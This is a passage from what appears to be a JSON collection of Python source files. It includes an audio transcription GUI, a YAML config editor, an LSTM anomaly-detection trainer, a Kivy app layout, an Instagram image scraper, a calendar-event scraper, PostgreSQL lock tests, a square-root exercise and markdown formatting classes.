1)).squeeze(-1).squeeze(-1)\n            )\n            remaining_features.remove(\"192\")\n            if len(remaining_features) == 0:\n                return tuple(features[a] for a in self.features_list)\n\n        x = self.Mixed_5b(x)\n        x = self.Mixed_5c(x)\n        x = self.Mixed_5d(x)\n        x = self.Mixed_6a(x)\n        x = self.Mixed_6b(x)\n        x = self.Mixed_6c(x)\n        x = self.Mixed_6d(x)\n        x = self.Mixed_6e(x)\n\n        if \"768\" in remaining_features:\n            features[\"768\"] = x[:, :7, :, :].reshape(x.shape[0], -1).to(torch.float32)\n            remain",
    "import tkinter as tk\nfrom tkinter import filedialog, messagebox, scrolledtext\nimport os\nimport threading\nfrom pydub import AudioSegment\nfrom vosk import Model, KaldiRecognizer\nimport wave\nimport json\n\ndef convert_to_wav(audio_path, output_directory):\n    if not audio_path.lower().endswith('.wav'):\n        output_path = os.path.join(output_directory, os.path.basename(audio_path).rsplit('.', 1)[0] + '.wav')\n        audio = AudioSegment.from_file(audio_path, format=audio_path.split('.')[-1])\n        audio.export(output_path, format=\"wav\")\n        return output_path\n    else:\n        return audio_path\n\ndef transcribe_audio_vosk(audio_path, model_path, callback):\n    try:\n        model = Model(model_path)\n        with wave.open(audio_path, \"rb\") as wf:\n            recognizer = KaldiRecognizer(model, wf.getframerate())\n            full_transcription = \"\"\n            while True:\n                data = wf.readframes(4000)\n                if len(data) == 0:\n                    break\n                if recognizer.AcceptWaveform(data):\n                    part_result = json.loads(recognizer.Result())\n                    full_transcription += part_result.get('text', '') + \" \"\n            part_result = json.loads(recognizer.FinalResult())\n            full_transcription += part_result.get('text', '')\n        callback(full_transcription.strip())\n    except Exception as e:\n        messagebox.showerror(\"Error\", f\"Failed to transcribe audio. Error: {e}\")\n\ndef update_transcription_text(transcription):\n    transcription_text.configure(state='normal')\n    transcription_text.delete(1.0, tk.END)\n    transcription_text.insert(tk.END, transcription)\n    transcription_text.configure(state='disabled')\n\ndef select_model_path():\n    model_path_value = filedialog.askdirectory()\n    if model_path_value:\n        model_path.set(model_path_value)\n\ndef select_file():\n    model_path_value = model_path.get()\n    if not model_path_value or not os.path.exists(model_path_value):\n        messagebox.showerror(\"Error\", \"Please select a valid Vosk model directory.\")\n        return\n    \n    file_path = filedialog.askopenfilename()\n    if file_path:\n        output_directory = None\n        if not file_path.lower().endswith('.wav'):\n            output_directory = filedialog.askdirectory(title=\"Select Output Directory for WAV Conversion\")\n            if not output_directory:\n                messagebox.showerror(\"Error\", \"Output directory is required for non-WAV files.\")\n                return\n            file_path = convert_to_wav(file_path, output_directory)\n\n        # Transcription is run on a separate thread to keep GUI responsive\n        threading.Thread(target=transcribe_audio_vosk, args=(file_path, model_path_value, update_transcription_text), daemon=True).start()\n\nroot = tk.Tk()\nroot.title(\"AudioDictate\")\n\n# Model path selection\nmodel_path_frame = tk.Frame(root)\nmodel_path_label = tk.Label(model_path_frame, text=\"Vosk Model Path:\")\nmodel_path_label.pack(side=tk.LEFT, padx=(0, 10))\nmodel_path = tk.StringVar()\nmodel_path_entry = tk.Entry(model_path_frame, textvariable=model_path, width=50)\nmodel_path_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)\nmodel_path_button = tk.Button(model_path_frame, text=\"Select\", command=select_model_path)\nmodel_path_button.pack(side=tk.LEFT)\nmodel_path_frame.pack(pady=5, padx=5, fill=tk.X)\n\n# Transcription display area\ntranscription_frame = tk.LabelFrame(root, text=\"Transcription\")\ntranscription_text = scrolledtext.ScrolledText(transcription_frame, width=60, height=15, state='disabled')\ntranscription_text.pack(expand=True, fill=tk.BOTH, padx=5, pady=5)\ntranscription_frame.pack(pady=10, padx=5, fill=tk.BOTH, expand=True)\n\n# Button to select file\nselect_file_button = tk.Button(root, text=\"Select Audio File\", command=select_file)\nselect_file_button.pack(pady=5)\n\nroot.mainloop()\n",
    "import yaml\n\ndef read_yaml_config(file_path):\n    with open(file_path, 'r') as file:\n        return yaml.safe_load(file)\n\ndef write_yaml_config(file_path, config):\n    with open(file_path, 'w') as file:\n        yaml.dump(config, file, sort_keys=False)\n\ndef find_or_create_category(config, category_name, category_icon):\n    for category in config['services']:\n        if category.get(\"name\") == category_name:\n            return category\n    # If category not found, create it\n    new_category = {\"name\": category_name, \"icon\": category_icon, \"items\": []}\n    config['services'].append(new_category)\n    return new_category\n\ndef add_service_to_config(file_path):\n    # Collecting input for category and service\n    category_name = input(\"Enter the category name (e.g., 'Apps'): \")\n    category_icon = input(\"Enter the category icon (leave blank for default 'fas fa-cloud'): \")\n    category_icon = category_icon if category_icon else \"fas fa-cloud\"\n\n    service_name = input(\"Enter the service name: \")\n    url = input(\"Enter the URL: \")\n    logo = input(\"Enter the logo URL or path (leave blank for default logo): \")\n    logo = logo if logo else \"assets/tools/sample2.png\"\n    tags = input(\"Enter tags (comma-separated, leave blank if none): \").split(',')\n    tags = None if tags == [''] else tags\n    keywords = input(\"Enter keywords (comma-separated, leave blank if none): \").split(',')\n    keywords = None if keywords == [''] else keywords\n\n    # Read the existing configuration\n    config = read_yaml_config(file_path)\n\n    # Make sure 'services' key exists\n    if 'services' not in config:\n        config['services'] = []\n\n    # Find the category or create a new one\n    category = find_or_create_category(config, category_name, category_icon)\n\n    # Creating the configuration dictionary for the new service\n    new_service = {\n        \"name\": service_name,\n        \"url\": url,\n        \"logo\": logo,\n        \"tags\": tags,\n        \"keywords\": keywords\n    }\n\n    # Add the new service to the category\n    category['items'].append(new_service)\n\n    # Write the updated configuration back to the file\n    write_yaml_config(file_path, config)\n    print(\"Configuration updated successfully!\")\n\n# Path to your Homer configuration file\nconfig_file_path = 'path/to/your/homer/config.yml'\nadd_service_to_config(config_file_path)\n",
    "# python new/train.py\n# train_loss=0.000128, val_loss=0.000142\n\nfrom model import AutoEncoder_LSTM, AutoEncoder_Wrapper\n\nimport os\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nimport matplotlib.pyplot as plt\n\ndata_path = \"ready_for_training\"\n\n\ndef load_and_combine_csv(directory):\n    combined_data = pd.DataFrame()\n    for filename in os.listdir(directory):\n        if filename.endswith(\".csv\"):\n            file_path = os.path.join(directory, filename)\n            data = pd.read_csv(file_path)\n            combined_data = pd.concat([combined_data, data], ignore_index=True)\n    return combined_data\n\n\ndef train_model(training_dir, sequence_length, test_size):\n    combined_data = load_and_combine_csv(training_dir)\n    flattened_sequences = combined_data.values\n\n    n_features = flattened_sequences.shape[1]\n\n    num_sequences = len(flattened_sequences) // sequence_length\n    sequences = flattened_sequences[: num_sequences * sequence_length].reshape(\n        (num_sequences, sequence_length, n_features)\n    )\n\n    X_train, X_test = train_test_split(sequences, test_size=test_size, random_state=42)\n    model = AutoEncoder_LSTM(n_features)\n    model_wrapper = AutoEncoder_Wrapper(model)\n    train_loader = model_wrapper.get_dataloader(X_train)\n    val_loader = model_wrapper.get_dataloader(X_test)\n    trainer = model_wrapper.get_trainer(500)\n    trainer.fit(model_wrapper, train_loader, val_loader)\n\n    plt.plot(trainer.logged_metrics[\"train_loss\"], label=\"Training Loss\")\n    plt.plot(trainer.logged_metrics[\"val_loss\"], label=\"Validation Loss\")\n    plt.title(\"Training and Validation Loss\")\n    plt.xlabel(\"Epoch\")\n    plt.ylabel(\"Loss\")\n    plt.legend()\n    plt.show()\n\n    model_wrapper.save_model(\"mouse_movement_anomaly_detection_model.pth\")\n\n\ntrain_model(data_path, 10, 0.2)\n\nprint(\"Model training complete and saved.\")\n",
    "from kivymd.app import MDApp\nfrom kivy.lang.builder import Builder\nfrom kivy.uix.screenmanager import ScreenManager, Screen\nfrom kivy_garden.mapview import MapView\nfrom kivy.core.window import Window\n\nWindow.size = (360,800)\n\nscreen_helper = \"\"\"\n\nScreenManager:\n    MenuScreen:\n    TempleScreen:\n    OmkarScreen:\n    BhagScreen:\n    TalaScreen:\n    PadiScreen:\n    GoldScreen:\n    MruScreen:\n    WaterScreen:\n    AbbScreen:\n    IruScreen:\n    MalScreen:\n    CheScreen:\n    NapScreen:\n    DevScreen:\n    FueScreen:\n    FoodScreen:\n    GrowScreen:\n    WineScreen:\n    RentScreen:\n    MapScreen:\n    HospScreen:\n\n\n<MenuScreen>:\n    name: 'menu'\n    MDIconButton:\n        icon: 'nut'\n        pos_hint:{'center_x' :0.9, 'center_y' :0.96}\n        theme_text_color: 'Custom'\n        text_color: app.theme_cls.accent_color\n        text_color: 0,0,0,1 \n    Image:\n        source: \"back.jpg\"\n        allow_stretch: True\n        keep_ratio: False\n        pos_hint: {'center_x' :0.5, 'center_y' :0.5}\n    Image:\n        source: \"logo.png\"\n        size_hint: 0.55,0.55\n        pos_hint: {'center_x' :0.5, 'center_y' :0.87}\n    ScrollView:\n        do_scroll_x: True\n        pos_hint: {'center_x':0.48,'center_y':0.73}\n        size_hint: 1,0.1\n        BoxLayout:\n            orientation: 'horizontal'\n            size_hint_x: None\n            width: 2150\n            padding: \"20dp\"\n            spacing: \"40dp\"\n            MDIconButton:\n                on_press: root.manager.current = 'fue'\n                Image:\n                    source: \"gas.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'food'\n                Image:\n                    source: \"food.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'grow'\n                Image:\n                    source: \"grocery.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'wine'\n                Image:\n                    source: \"wine.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'rent'\n                Image:\n                    source: \"rent.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'hosp'\n                Image:\n                    source: \"medi.png\"\n                    size_hint: 2.3,2.3\n            MDRectangleFlatButton:\n                text: 'Bamboo Shoot'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 143/255,177/255,236/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Noolputtu'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 230/255,155/255,253/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Curd Rice'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 236/255,171/255,143/255\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Jackfruit'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 143/255,177/255,236/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.26,'center_y':0.57}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        on_press: root.manager.current = 'temple'\n        Image:\n            source: \"temple.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.74,'center_y':0.57}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        on_press: root.manager.current = 'water'\n        Image:\n            source: \"water.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.26,'center_y':0.36}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        Image:\n            source: \"mountain.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.74,'center_y':0.36}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        Image:\n            source: \"resort.png\"\n            size_hint: 1.3,1.3\n    ",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.maximize_window()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\n\r\nusername.send_keys(\"xxxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\nname_search = \"xxxxxxxxxxxx\" # Write Username Of Account\r\n\r\nurl = f\"https://www.instagram.com/{name_search}/\"\r\n\r\ntime.sleep(3)\r\ndriver.get(url)\r\ntime.sleep(10)\r\n\r\n\r\n#scroll\r\nscrolldown=driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\nmatch=False\r\nposts = []\r\nwhile(match==False):\r\n    last_count = scrolldown\r\n    time.sleep(3)\r\n    scrolldown = driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\n\r\n    links = driver.find_elements(By.TAG_NAME, \"a\")\r\n    for link in links:\r\n        try:\r\n            post = link.get_attribute('href')\r\n        except:\r\n            continue\r\n        if post not in posts:\r\n            if '/p/' in post:\r\n                posts.append(post)\r\n\r\n\r\n    if last_count==scrolldown:\r\n        match=True\r\n\r\n\r\nimgs_link = []\r\nnumber = 1\r\n\r\n#get videos and images\r\ndownload_url = ''\r\nfor post in posts:\r\n    driver.get(post)\r\n    shortcode = driver.current_url.split('/')[-2]\r\n    num = 1\r\n    time.sleep(3)\r\n\r\n    main_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\n    while True:\r\n        imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n        for img in imgs:\r\n            link = img.get_attribute('src')\r\n            if link not in imgs_link:\r\n                urllib.request.urlretrieve(link, f'img_{number}{shortcode}{num}.jpg')\r\n                num += 1\r\n                imgs_link.append(link)\r\n\r\n                time.sleep(5)\r\n\r\n        try:\r\n            driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n            time.sleep(3)\r\n        except:\r\n            number += 1\r\n            break\r\n",
    "import datetime\nimport os.path\nimport time\n\nfrom decouple import config\nfrom google.auth.transport.requests import Request\nfrom google.oauth2.credentials import Credentials\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.errors import HttpError\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\nSCOPES = [\"https://www.googleapis.com/auth/calendar\"]\n\n\n\"\"\"\nThe function `create_event` is part of a script to create Google Calendar events based on data obtained by web scraping. \nIt takes six parameters:\n\n- `name`: A string representing the summary of the event to be created.\n- `location`: A string representing the location of the event to be created.\n- `description`: A string representing the description of the event to be created.\n- `start`: A string with ISO format representing the start date and time of the event.\n- `end`: A string with ISO format representing the end date and time of the event.\n- `jb`: A string with the value of either \"j\" OR \"b\". If \"j\", the event is linked to the \"Match\" Calendar. If \"b\", \n  the event is linked to the \"Referee\" Calendar.\n\nIt returns nothing, but as a side effect, it creates a new event in the Google Calendar with the specified `name`,\n`location`, `description`, `start`, and `end` and prints the link to the created event.\n\"\"\"\n\ndef create_event(name, location, description, start, end, jb):\n    creds = None\n\n    if os.path.exists(\"token.json\"):\n        creds = Credentials.from_authorized_user_file(\"token.json\", SCOPES)\n        \n    if not creds or not creds.valid:\n        if creds and creds.expired and creds.refresh_token:\n            creds.refresh(Request())\n        else:\n            flow = InstalledAppFlow.from_client_secrets_file(\n                \"credentials.json\", SCOPES\n            )\n            creds = flow.run_local_server(port=0)\n            \n        with open(\"token.json\", \"w\") as token:\n            token.write(creds.to_json())\n\n    try:\n        service = build(\"calendar\", \"v3\", credentials=creds)\n\n        event = {\n            'summary': name,\n            'location': location,\n            'description': description,\n            'start': {\n                'dateTime': start,\n                'timeZone': 'Europe/Budapest',\n            },\n            'end': {\n                'dateTime': end,\n                'timeZone': 'Europe/Budapest',\n            }\n        }\n        cal_id = \"primary\"\n        if jb == \"j\":\n            cal_id = config(\"CAL_ID_MATCH\")\n        elif jb == \"b\":\n            cal_id = config(\"CAL_ID_REF\")\n        event = service.events().insert(calendarId=cal_id, body=event).execute()\n        print('Event created: ', event.get('htmlLink'))\n    except HttpError as error:\n        print(f\"An error occurred: {error}\")\n\n\nmerkozeskod = input('M\u00e9rk\u0151z\u00e9sk\u00f3d: ')\n\njatekos_v_biro = input('J\u00e1t\u00e9kosk\u00e9nt vagy b\u00edr\u00f3k\u00e9nt (j/b): ').lower()\nwhile jatekos_v_biro != \"j\" and jatekos_v_biro != \"b\":\n    jatekos_v_biro = input('J\u00e1t\u00e9kosk\u00e9nt vagy b\u00edr\u00f3k\u00e9nt (j/b): ').lower()\n\n# web scraping using selenium\n\nchrome_options = webdriver.ChromeOptions()\nchrome_options.add_argument('--headless')\ndriver = webdriver.Chrome(options=chrome_options)\ndriver.get(f\"https://mksz.hu/jegyzokonyv/{merkozeskod}\")\ntime.sleep(3)\n\nhelyszin = driver.find_element(by=By.XPATH, value=\"/html/body/div/div/div[2]/div[2]/div/div/div/div[1]/div[2]/table[\"\n                                                  \"3]/tbody/tr[2]/td[1]\").text[9:]\n\nhazai = driver.find_element(by=By.XPATH, value=\"/html/body/div/div/div[2]/div[2]/div/div/div/div[1]/div[2]/table[\"\n                                               \"1]/tbody/tr/td[1]\").text[2:]\n\nvendeg = driver.find_element(by=By.XPATH, value=\"/html/body/div/div/div[2]/div[2]/div/div/div/div[1]/div[2]/table[\"\n                                                \"1]/tbody/tr/td[3]\").text[2:]\n\nidopont_raw = driver.find_element(by=By.XPATH, value=\"/html/body/div/div/div[2]/div[2]/div/div/div/div[1]/div[2]/table[\"\n                                                     \"3]/tbody/tr[1]/td[1]\").text\n\nidopont = datetime.datetime.strptime(idopont_raw, \"%Y. %m. %d. - %H:%M\")\n\n# we call the create event function to insert a new event into google calendar\ncreate_event(f\"{hazai} - {vendeg}\",\n             helyszin,\n             f\"https://www.mksz.hu/jegyzokonyv/{merkozeskod}\",\n             idopont.strftime(\"%Y-%m-%dT%H:%M:%S\"),\n             (idopont + datetime.timedelta(minutes=50)).strftime(\"%Y-%m-%dT%H:%M:%S\"),\n             jatekos_v_biro)\n",
    "from __future__ import annotations\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nimport enum\nimport json\nimport threading\nimport time\n\nfrom typing import Iterator\nimport psycopg\nimport pytest\n\nROOT_URL = \"postgres:///postgres\"\nURL = \"postgres:///pglockpy\"\nSET_UP_SQL = \"\"\"\n    CREATE TABLE t (id INT);\n    CREATE TABLE u (id INT);\n    CREATE TABLE v (with_unique_index INT UNIQUE);\n    CREATE MATERIALIZED VIEW mat AS SELECT * FROM t;\n    CREATE INDEX idx ON t (id);\n    CREATE OR REPLACE FUNCTION f() RETURNS TRIGGER AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;\n    ALTER TABLE t ADD CONSTRAINT constr CHECK (id > 0) NOT VALID;\n    CREATE SEQUENCE seq;\n\"\"\"\n\n\n@dataclass\nclass Connections:\n    a: psycopg.Connection\n    b: psycopg.Connection\n    c: psycopg.Connection  # no implicit TRANSACTION\n\n\n@dataclass(frozen=True)\nclass Lock:\n    relation: str\n    lock_kind: LockKind\n\n    @staticmethod\n    def from_mode(relation: str, mode: str) -> Lock:\n        lock_kind = {\n            \"AccessExclusiveLock\": L.ACCESS_EXCLUSIVE,\n            \"ExclusiveLock\": L.EXCLUSIVE,\n            \"ShareRowExclusiveLock\": L.SHARE_ROW_EXCLUSIVE,\n            \"ShareLock\": L.SHARE,\n            \"ShareUpdateExclusiveLock\": L.SHARE_UPDATE_EXCLUSIVE,\n            \"RowExclusiveLock\": L.ROW_EXCLUSIVE,\n            \"RowShareLock\": L.ROW_SHARE,\n            \"AccessShareLock\": L.ACCESS_SHARE,\n        }[mode]\n        return Lock(relation, lock_kind)\n\n\n@pytest.fixture\ndef conns() -> Iterator[Connections]:\n    \"\"\"Whole fresh database with N connections per test.\n\n    Not quick, but simple.\n    \"\"\"\n    try:\n        with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n            conn.execute(\"DROP DATABASE pglockpy\")\n    except Exception:\n        pass\n\n    with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n        conn.execute(\"CREATE DATABASE pglockpy\")\n\n    with (\n        psycopg.connect(URL) as a,\n        psycopg.connect(URL) as b,\n        psycopg.connect(URL, autocommit=True) as c,\n    ):\n        a.execute(SET_UP_SQL)\n        a.commit()\n        yield Connections(a, b, c)\n\n\nclass LockKind(enum.Enum):\n    ACCESS_EXCLUSIVE = \"ACCESS EXCLUSIVE\"\n    EXCLUSIVE = \"EXCLUSIVE\"\n    SHARE_ROW_EXCLUSIVE = \"SHARE ROW EXCLUSIVE\"\n    SHARE = \"SHARE\"\n    SHARE_UPDATE_EXCLUSIVE = \"SHARE UPDATE EXCLUSIVE\"\n    ROW_EXCLUSIVE = \"ROW EXCLUSIVE\"\n    ROW_SHARE = \"ROW SHARE\"\n    ACCESS_SHARE = \"ACCESS SHARE\"\n    # SELECT ... FOR\n    FOR_UPDATE = \"FOR UPDATE\"\n    FOR_NO_KEY_UPDATE = \"FOR NO KEY UPDATE\"\n    FOR_SHARE = \"FOR SHARE\"\n    FOR_KEY_SHARE = \"FOR KEY SHARE\"\n\n\nL = LockKind\n\n\nclass Statement(enum.Enum):\n    DROP_TABLE = \"DROP TABLE t\"\n    TRUNCATE = \"TRUNCATE t\"\n    CREATE_TABLE = \"CREATE TABLE v (id INT)\"\n    ALTER_TABLE = \"ALTER TABLE t ADD COLUMN col INT\"\n    REINDEX = \"REINDEX TABLE t\"\n    VACUUM_FULL = \"VACUUM FULL\"\n    REFERESH_MATERIALIZED_VIEW = \"REFRESH MATERIALIZED VIEW mat\"\n    ALTER_TABLE_FOREIGN_KEY = (\n        \"ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (id) REFERENCES u (id)\"\n    )\n    CREATE_TRIGGER = (\n        \"CREATE TRIGGER trig AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()\"\n    )\n    CREATE_INDEX = \"CREATE INDEX idy ON t (id)\"\n    VACUUM = \"VACUUM\"\n    ANALYZE = \"ANALYZE\"\n    CREATE_INDEX_CONCURRENTLY = \"CREATE INDEX CONCURRENTLY idy ON t (id)\"\n    CREATE_STATISTICS = \"CREATE STATISTICS stat ON id FROM t\"\n    REINDEX_CONCURRENTLY = \"REINDEX TABLE CONCURRENTLY t\"\n    ALTER_TABLE_SET_STATISTICS = \"ALTER TABLE t ALTER COLUMN id SET STATISTICS 100\"\n    ALTER_TABLE_VALIDATE_CONSTRAINT = \"ALTER TABLE t VALIDATE CONSTRAINT constr\"\n    ALTER_INDEX_RENAME = \"ALTER INDEX idx RENAME TO idy\"\n    UPDATE = \"UPDATE t SET id = 4\"\n    UPDATE_UNIQUE = \"UPDATE v SET with_unique_index = 4\"\n    DELETE = \"DELETE FROM t\"\n    INSERT = \"INSERT INTO t VALUES (1)\"\n    MERGE = \"MERGE INTO t USING u AS sub ON t.id = u.id WHEN MATCHED THEN DO NOTHING\"\n    SELECT_FOR_UPDATE = \"SELECT * FROM t FOR UPDATE\"\n    SELECT_FOR_NO_KEY_UPDATE = \"SELECT * FROM t FOR NO KEY UPDATE\"\n    SELECT_FOR_SHARE = \"SELECT * FROM t FOR SHARE\"\n    SELECT_FOR_KEY_SHARE = \"SELECT * FROM t FOR KEY SHARE\"\n    SELECT = \"SELECT * FROM t\"\n\n    @property\n    def name_no_underscore(self) -> str:\n        return self.name.replace(\"_\", \" \")\n\n\n@dataclass\nclass LockRelationship:\n    original_lock: LockKind\n    doesnt_block: list[LockKind]\n    blocks: list[LockKind]\n\n\nTABLE_LOCK_RELATIONSHIPS = [\n    LockRelationship(\n        original_lock=L.ACCESS_EXCLUSIVE,\n        doesnt_block=[],\n        blocks=      [L.ACCESS_SHARE, L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE],\n        blocks=      [                L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.SHARE_ROW_EXCLUSIVE,\n        d",
    "class Solution:\n    def mySqrt_brute_force(self, x: int) -> int:\n\n        for i in range(x):\n            if x == 2:\n                return 1\n            elif i**2 > x:\n                return i - 1\n        return x\n\n    def mySqrt_optimal(self, x: int) -> int:\n        \"\"\"\n        The reason this works log(n) < sqrt(n)\n        \"\"\"\n        res, left, right = 0, 0, x\n\n        while left <= right:\n            mid = (right - left) // 2 + left\n            mid_squared = mid**2\n\n            if mid_squared < x:\n                left = mid + 1\n                res = mid  # Save the value as a possible result.\n                # This is because for values where the square is less than x, we update the left bound of the\n                # search range and keep track of this mid value as a potential result.\n                # For example, when finding the square root of 8, the loop will set res = 2 (mid = 2)\n                # since the square of 2 is 4, which is less than 8, and we know the square root is between 2 and 3.\n            elif mid_squared > x:\n                right = mid - 1\n            else:\n                return mid\n        return res\n\n\n\ndef test_mySqrt():\n    solution = Solution()\n    assert solution.mySqrt_brute_force(0) == 0\n    assert solution.mySqrt_brute_force(1) == 1\n    assert solution.mySqrt_brute_force(2) == 1\n    assert solution.mySqrt_brute_force(3) == 1\n    assert solution.mySqrt_brute_force(4) == 2\n    assert solution.mySqrt_brute_force(8) == 2\n    assert solution.mySqrt_brute_force(9) == 3\n    assert solution.mySqrt_brute_force(16) == 4\n    assert solution.mySqrt_brute_force(17) == 4\n    assert solution.mySqrt_brute_force(2147395599) == 46339\n    assert solution.mySqrt_optimal(0) == 0\n    assert solution.mySqrt_optimal(1) == 1\n    assert solution.mySqrt_optimal(2) == 1\n    assert solution.mySqrt_optimal(3) == 1\n    assert solution.mySqrt_optimal(4) == 2\n    assert solution.mySqrt_optimal(8) == 2\n    assert solution.mySqrt_optimal(9) == 3\n    assert solution.mySqrt_optimal(16) == 4\n    assert solution.mySqrt_optimal(17) == 4\n    assert solution.mySqrt_optimal(2147395599) == 46339\n\ntest_mySqrt()\nprint(\"All Test Cases Passed!\")\n",
    "from abc import ABC\n\n\nclass MarkdownText(ABC):\n    def __init__(self, *parts):\n        _parts = map(\n            lambda part: PlainText(part) if isinstance(part, str) else part, parts\n        )\n        self.parts = list(_parts)\n\n    def __add__(self, other):\n        if isinstance(other, str):\n            return MarkdownText(self, PlainText(other))\n        elif isinstance(other, MarkdownText):\n            return MarkdownText(self, other)\n        else:\n            raise ValueError('This data type is not supported for [other] parameter')\n\n    def __str__(self):\n        return self.escaped_text()\n\n    def append(self, element):\n        if isinstance(element, str):\n            self.parts.append(PlainText(element))\n        elif isinstance(element, MarkdownText):\n            self.parts.append(element)\n        else:\n            raise ValueError('This data type is not supported for [element] parameter')\n\n        return self\n\n    def append_ln(self):\n        return self.append(PlainText('\\n'))\n\n    def escaped_text(self):\n        text = ''\n\n        for part in self.parts:\n            is_form_new_line = text == '' or text.endswith('\\n') or text.endswith('\\n\\r')\n\n            if not is_form_new_line and isinstance(part, QuoteBlock):\n                text += f'\\n{part.escaped_text()}'\n            else:\n                text += part.escaped_text()\n\n        return text\n\n\nclass _StyledText(MarkdownText):\n    def __init__(self, text: str | MarkdownText):\n        if isinstance(text, str):\n            _parts = [PlainText(text)]\n        elif isinstance(text, MarkdownText):\n            _parts = [text]\n        else:\n            raise ValueError('This data type is not supported for [text] parameter')\n\n        super().__init__(*_parts)\n\n    @property\n    def leading_mark(self):\n        return ''\n\n    @property\n    def trailing_mark(self):\n        return ''\n\n    def escaped_text(self):\n        return self.leading_mark + super().escaped_text() + self.trailing_mark\n\n\nclass Bold(_StyledText):\n    @property\n    def leading_mark(self): return '*'\n\n    @property\n    def trailing_mark(self): return '*'\n\n\nclass Strikethrough(_StyledText):\n    @property\n    def leading_mark(self): return '~'\n\n    @property\n    def trailing_mark(self): return '~'\n\n\nclass Spoiler(_StyledText):\n    @property\n    def leading_mark(self): return '||'\n\n    @property\n    def trailing_mark(self): return '||'\n\n\nclass Italic(_StyledText):\n    @property\n    def leading_mark(self): return '_'\n\n    @property\n    def trailing_mark(self): return '_'\n\n    def escaped_text(self):\n        text = ''.join(part.escaped_text() for part in self.parts)\n        text = _fix_underscore_ambiguity(text)\n        return self.leading_mark + text + 